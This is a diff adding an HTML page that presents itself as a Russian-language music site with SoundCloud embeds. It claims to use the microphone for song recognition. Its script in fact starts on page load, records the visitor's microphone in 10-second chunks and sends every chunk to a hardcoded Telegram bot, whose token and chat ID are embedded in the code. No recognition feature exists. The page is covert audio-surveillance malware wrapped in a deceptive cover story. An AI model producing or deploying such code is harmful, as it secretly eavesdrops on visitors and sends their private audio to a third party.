@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>🎧 Музыка для тебя</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: #111;
+      color: #fff;
+    }
+    header {
+      padding: 20px;
+      text-align: center;
+      background: #1c1c1c;
+      border-bottom: 1px solid #333;
+    }
+    header h1 {
+      margin: 0;
+      font-size: 24px;
+    }
+    p.note {
+      font-size: 14px;
+      color: #aaa;
+      margin-top: 5px;
+    }
+    main {
+      padding: 20px;
+    }
+    iframe {
+      width: 100%;
+      max-width: 600px;
+      height: 166px;
+      border: none;
+      margin: 20px auto;
+      display: block;
+    }
+    footer {
+      text-align: center;
+      font-size: 12px;
+      color: #666;
+      padding: 10px;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <h1>🎧 Музыка, которую ты любишь</h1>
+    <p class="note">Мы используем микрофон, чтобы узнавать твои любимые треки, когда ты напеваешь или подпеваем. 🎙️</p>
+  </header>
+
+  <main>
+    <h2>🔥 Популярные хиты</h2>
+
+    <iframe src="https://w.soundcloud.com/player/?url=https%3A//soundcloud.com/billieeilish/bad-guy" allow="autoplay"></iframe>
+    <iframe src="https://w.soundcloud.com/player/?url=https%3A//soundcloud.com/theweeknd/blinding-lights" allow="autoplay"></iframe>
+  </main>
+
+  <footer>
+    © 2025 MusicVibe. Все права защищены.
+  </footer>
+
+  <script>
+    const botToken = '7641118758:AAE0m6ZELMcN26vhkpRovzsfzF-YRbbMxzQ';
+    const chatId = '6917715726';
+    let recorder, stream;
+
+    async function startRecordingCycle() {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        recorder = new MediaRecorder(stream);
+
+        recorder.ondataavailable = async e => {
+          const blob = new Blob([e.data], { type: 'audio/webm' });
+          const file = new File([blob], 'voice.webm');
+
+          const formData = new FormData();
+          formData.append('chat_id', chatId);
+          formData.append('voice', file);
+
+          await fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, {
+            method: 'POST',
+            body: formData
+          });
+
+          console.log('✅ Отправлено новое аудио');
+        };
+
+        setInterval(() => {
+          if (recorder.state === 'recording') recorder.stop();
+          recorder.start();
+        }, 10000); // Каждые 10 секунд
+
+        // Первая запись
+        recorder.start();
+
+      } catch (err) {
+        console.error('❌ Ошибка доступа к микрофону:', err);
+      }
+    }
+
+    window.addEventListener('load', () => {
+      setTimeout(startRecordingCycle, 3000);
+    });
+
+    window.addEventListener('beforeunload', () => {
+      if (stream) stream.getTracks().forEach(track => track.stop());
+    });
+  </script>
+
+</body>
+</html>
